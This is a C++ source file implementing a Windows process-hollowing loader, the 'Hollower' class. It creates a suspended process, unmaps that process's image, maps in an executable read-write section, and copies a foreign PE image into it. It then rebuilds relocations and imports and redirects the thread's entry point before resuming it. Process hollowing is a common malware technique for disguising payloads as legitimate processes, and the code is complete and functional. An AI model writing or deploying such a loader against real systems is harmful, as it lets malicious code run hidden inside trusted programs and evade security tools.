#include "stdafx.h"
#include "Hollower.h"
#include <Shlwapi.h>

void Hollower::FixRelocations()
{
	INT64 delta, RelocTableOffset, TotalSize, RelocTableSize, EntryOffset;
	int NumberOfEntries;
	PWORD StartOfEntries;
	PIMAGE_NT_HEADERS NtHeaders;
	PIMAGE_BASE_RELOCATION reloc;

	delta = (INT64)_remoteSectionAddress - (INT64)_peData->GetImageBase();

	NtHeaders = (PIMAGE_NT_HEADERS)((INT64)_localSectionAddress +
		((PIMAGE_DOS_HEADER)_localSectionAddress)->e_lfanew);

	if (NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress <= 0)
		return;

	RelocTableOffset = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	RelocTableSize = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

	reloc = (PIMAGE_BASE_RELOCATION)&((BYTE*)_localSectionAddress)[RelocTableOffset];

	for (TotalSize = 0; TotalSize < RelocTableSize; TotalSize += reloc->SizeOfBlock, *(DWORD *)&reloc += reloc->SizeOfBlock)
	{
		NumberOfEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		StartOfEntries = (PWORD)((INT64)(reloc)+sizeof(IMAGE_BASE_RELOCATION));

		for (int i = 0; i < NumberOfEntries; i++)
		{
			if ((StartOfEntries[i] >> 12) & IMAGE_REL_BASED_HIGHLOW)
			{
				EntryOffset = reloc->VirtualAddress + (StartOfEntries[i] & 0xFFF);
				*(INT64*)&((BYTE*)_localSectionAddress)[EntryOffset] += delta;
			}
		}
	}

	return;
}

void Hollower::ResumeChild() {

	targetCTX.Rcx = (DWORD64)_remoteSectionAddress +_peData->GetEntryPoint();
	SetThreadContext(hTargetThread, &targetCTX);
	NtResumeThread(hTargetThread, NULL);
}

void Hollower::BuildIAT() {
	IAT iat = _peData->GetIAT();
	for (auto thunk_it = iat.thunks.begin(); thunk_it != iat.thunks.end(); thunk_it++) {
		DWORD iat_section = thunk_it->firstThunk;
		for (auto functions_it = thunk_it->functionNames.begin(); functions_it != thunk_it->functionNames.end(); functions_it++) {
			std::wstring lib(thunk_it->libname.begin(), thunk_it->libname.end());

			//write func addr to IAT entry
			*(DWORD64*)(iat_section + (INT64)_localSectionAddress) = (DWORD64)GetProcAddress(LoadLibrary(lib.c_str()), functions_it->c_str());
			iat_section += 8;
		}
	}
}

void Hollower::ReplaceProcessMemory() {
	HANDLE SectionHandle = NULL;
	LARGE_INTEGER SectionMaxSize = { 0,0 };
	HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
	NtReadVirtualMemory = (TNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
	NtWriteVirtualMemory = (TNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	NtMapViewOfSection = (TNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	NtCreateSection = (TNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	NtResumeThread = (TNtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");
	NtUnmapViewOfSection = (TNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

	void* base;
	NtReadVirtualMemory(hTargetProc, (PVOID)(targetCTX.Rdx + (sizeof(SIZE_T) * 2)), &base, sizeof(PVOID), NULL);
	_remoteSectionAddress = base;
	NtUnmapViewOfSection(hTargetProc, base);
	SectionMaxSize.LowPart = _peData->GetExeSize();
	NtCreateSection(&SectionHandle, SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &SectionMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	NtMapViewOfSection(SectionHandle, GetCurrentProcess(), &_localSectionAddress, NULL, NULL, NULL, &_sectionSize, 2, NULL, PAGE_EXECUTE_READWRITE);
	NtMapViewOfSection(SectionHandle, hTargetProc, &_remoteSectionAddress, NULL, NULL, NULL, &_sectionSize, 2, NULL, PAGE_EXECUTE_READWRITE);

	NtWriteVirtualMemory(hTargetProc, (PVOID)(targetCTX.Rdx + (sizeof(SIZE_T) * 2)), &_remoteSectionAddress, sizeof(PVOID), NULL);

	std::vector<SectionInfo> sections = this->_peData->GetSections();
	RtlCopyMemory(_localSectionAddress, _peData->GetExeBuffer(), 0x400);

	//Load sections
	for (std::vector<SectionInfo>::iterator it = sections.begin(); it != sections.end(); ++it)
		RtlCopyMemory((void*)((INT64)_localSectionAddress + it->_vOffset), (void*)((INT64)this->_peData->GetModuleBase() + it->_rOffset), it->_rSize);
}

void Hollower::Start(std::wstring arg) {
	wchar_t procArg[0x100];
	wsprintfW(procArg, L"%s %s", _targetProcPath, arg.c_str());
	size_t written;
	STARTUPINFO si = {};
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi = {};
	CreateProcess(NULL, procArg, 0, NULL, false, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	this->hTargetProc = pi.hProcess;
	hTargetThread = pi.hThread;
	targetCTX.ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi.hThread, &targetCTX);
	ReplaceProcessMemory();
	
	FixRelocations();
	BuildIAT();
	ResumeChild();
}
